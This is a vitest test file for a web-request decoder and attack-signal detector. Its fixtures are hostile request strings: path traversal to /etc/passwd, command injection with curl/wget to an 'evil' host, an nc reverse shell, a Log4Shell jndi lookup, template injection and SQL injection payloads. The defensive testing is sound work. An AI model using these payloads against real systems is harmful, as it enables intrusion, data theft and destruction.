import { describe, it, expect } from "vitest";
import {
  decodeRequestTarget,
  escapeControlChars,
  webAttackSignal,
  clipField,
  MAX_FIELD,
} from "../../src/analysis/webRequestDecode.js";

// #930 item 3: a bounded decoder and CONTEXTUAL attack shapes. Bare fragments never fire; the
// decoder never evaluates anything; the whole field is inspected up to a real bound.

describe("decodeRequestTarget", () => {
  it("decodes one, two and three layers and reports the pass count", () => {
    expect(decodeRequestTarget("/a%2Fb").decoded).toBe("/a/b");
    expect(decodeRequestTarget("/a%252Fb")).toMatchObject({ decoded: "/a/b", passes: 2 });
    expect(decodeRequestTarget("/a%25252Fb")).toMatchObject({ decoded: "/a/b", passes: 3 });
  });
  it("stops at three passes — a fourth layer stays encoded", () => {
    expect(decodeRequestTarget("/a%2525252Fb").decoded).toBe("/a%2Fb");
  });
  it("turns + into a space in the query only, and handles %uXXXX", () => {
    expect(decodeRequestTarget("/a+b?q=c+d").decoded).toBe("/a+b?q=c d");
    expect(decodeRequestTarget("/x?q=%u0041").decoded).toBe("/x?q=A");
  });
  it("leaves malformed escapes as-is and says so", () => {
    for (const bad of ["/x%", "/x%zz", "/x%2", "/x%u12"]) {
      const r = decodeRequestTarget(bad);
      expect(r.decoded, bad).toBe(bad);
      expect(r.malformed, bad).toBe(true);
    }
  });
  it("decodes the whole field, so a payload at the far end is found", () => {
    const r = decodeRequestTarget(`/x?pad=${"a".repeat(60000)}&cmd=%3Bid`);
    expect(r.decoded.endsWith("&cmd=;id")).toBe(true);
  });
  it("is safe on garbage", () => {
    for (const g of ["", "%", "%%%%", "%00%00", "%uD800", " ", "?".repeat(10)]) {
      expect(() => decodeRequestTarget(g), g).not.toThrow();
    }
  });
  it("finishes a pathological body quickly", () => {
    const t0 = performance.now();
    decodeRequestTarget("%".repeat(MAX_FIELD));
    decodeRequestTarget("../".repeat(MAX_FIELD / 3));
    expect(performance.now() - t0).toBeLessThan(200);
  });
});

describe("escapeControlChars", () => {
  it("renders C0, DEL and C1 as visible tokens so a decoded NUL never reaches case text", () => {
    expect(escapeControlChars("a\x00b\x1fc\x7fd\x85e")).toBe("a\\x00b\\x1fc\\x7fd\\x85e");
    expect(escapeControlChars("plain")).toBe("plain");
  });
});

describe("clipField", () => {
  it("passes a field at the bound through and clips one past it, reporting the true length", () => {
    expect(clipField("a".repeat(MAX_FIELD))).toEqual({ text: "a".repeat(MAX_FIELD), oversized: null });
    const r = clipField("a".repeat(MAX_FIELD + 5));
    expect(r.text).toHaveLength(MAX_FIELD);
    expect(r.oversized).toBe(MAX_FIELD + 5);
  });
});

describe("webAttackSignal", () => {
  const fires = (s: string): string[] => webAttackSignal(s)?.families ?? [];

  it("traversal: a segment followed by a sensitive target", () => {
    expect(fires("/../../../etc/passwd")).toEqual(["traversal"]);
    expect(fires("/img?f=..\\..\\windows\\win.ini")).toEqual(["traversal"]);
    expect(fires("/api?p=../.env")).toEqual(["traversal"]);
  });
  it("traversal: a relative image path or a lone segment is not a signal", () => {
    expect(fires("/assets/../images/logo.png")).toEqual([]);
    expect(fires("/cms?page=../..")).toEqual([]);
  });

  it("cmd: an interpreter or transfer tool with an argument after any separator", () => {
    expect(fires("/index.php?cmd=;cat /etc/passwd")).toContain("cmd");
    expect(fires("/x?q=a && curl http://evil/x.sh")).toContain("cmd");
    expect(fires("/x?q=`nc -e /bin/sh 1.2.3.4 4444`")).toContain("cmd");
    expect(fires("/x?q=$(powershell -enc AAAA)")).toContain("cmd");
    expect(fires("/x?q=a|wget http://evil/x")).toContain("cmd");
  });
  it("cmd: the free tier fires bare after any separator", () => {
    expect(fires("/x?q=;whoami")).toContain("cmd");
    expect(fires("/x?q=|whoami")).toContain("cmd");
    expect(fires("/x?q=|netstat")).toContain("cmd");
  });
  it("cmd: the strict tier fires bare after ; && || ` $( and after a bare pipe only with a flag or an absolute path", () => {
    expect(fires("/x?q=;id")).toContain("cmd");
    expect(fires("/x?q=;hostname")).toContain("cmd");
    expect(fires("/x?q=$(uname)")).toContain("cmd");
    expect(fires("/x?q=x|uname -a")).toContain("cmd");
    expect(fires("/x?q=x|id -u")).toContain("cmd");
    expect(fires("/x?q=x|hostname -f")).toContain("cmd");
    expect(fires("/x?q=x|ls /tmp")).toContain("cmd");
    expect(fires("/api?fields=name|id")).toEqual([]);
    expect(fires("/api?fields=name|hostname")).toEqual([]);
    expect(fires("/api?fields=user|uname&sort=asc")).toEqual([]);
    expect(fires("/x?q=|ls tmp")).toEqual([]); // the stated cost
  });
  it("cmd: bare fragments and matrix parameters are not signals", () => {
    expect(fires("/bin/sh/docs")).toEqual([]);
    expect(fires("/api?filter=a|b")).toEqual([]);
    expect(fires("/search?q=nc")).toEqual([]);
    expect(fires("/path;jsessionid=abc")).toEqual([]);
    expect(fires("/x;id=5")).toEqual([]);
  });

  it("expression: jndi, a nested lookup, and a template expression with an operator or call", () => {
    expect(fires("/x?u=${jndi:ldap://evil/a}")).toContain("expression");
    expect(fires("/x?u=${${lower:j}ndi:ldap://evil/a}")).toContain("expression");
    expect(fires("/x?name={{7*7}}")).toContain("expression");
    expect(fires("/x?name=#{7*7}")).toContain("expression");
    expect(fires("/x?name=${T(java.lang.Runtime)}")).toContain("expression");
  });
  it("expression: a plain placeholder is not a signal", () => {
    expect(fires("/x?msg=${price}")).toEqual([]);
    expect(fires("/x?tpl={{name}}")).toEqual([]);
  });

  it("sqli: multi-token shapes with structure", () => {
    expect(fires("/x?id=1 union select 1,2,3")).toContain("sqli");
    expect(fires("/x?id=1 union all select 1")).toContain("sqli");
    expect(fires("/x?id=1' or 1=1--")).toContain("sqli");
    expect(fires("/x?id=1' or 'a'='a")).toContain("sqli");
    expect(fires("/x?id=1' and sleep(5)--")).toContain("sqli");
    expect(fires("/x?id=1; waitfor delay '0:0:5'")).toContain("sqli");
    expect(fires("/x?id=1 or benchmark(1000000,md5(1))")).toContain("sqli");
    expect(fires("/x?id=1; drop table users")).toContain("sqli");
  });
  it("sqli: a function name in a docs or search path is not a signal", () => {
    expect(fires("/docs/sleep(")).toEqual([]);
    expect(fires("/search?q=sleep%28")).toEqual([]);
    expect(fires("/search?q=select name from users")).toEqual([]);
  });

  it("returns the full match for identity and a bounded, escaped excerpt for display", () => {
    const long = `/x?q=;curl http://evil/${"a".repeat(200)}`;
    const r = webAttackSignal(long)!;
    expect(r.matches[0].family).toBe("cmd");
    expect(r.matches[0].match.length).toBeGreaterThan(60);
    expect(r.matches[0].match.length).toBeLessThanOrEqual(512);
    expect(r.matches[0].excerpt.length).toBeLessThanOrEqual(60);
    const nul = webAttackSignal("/x?q=;id\x00")!;
    expect(nul.matches[0].excerpt).not.toMatch(/\x00/);
  });

  it("fires on the decoded form of an encoded attack", () => {
    const enc = decodeRequestTarget("/x?q=%3Bcat%20%2Fetc%2Fpasswd").decoded;
    expect(fires(enc)).toContain("cmd");
    expect(fires(decodeRequestTarget("/x?f=%2e%2e%2f%2e%2e%2fetc%2fpasswd").decoded)).toContain("traversal");
  });
});
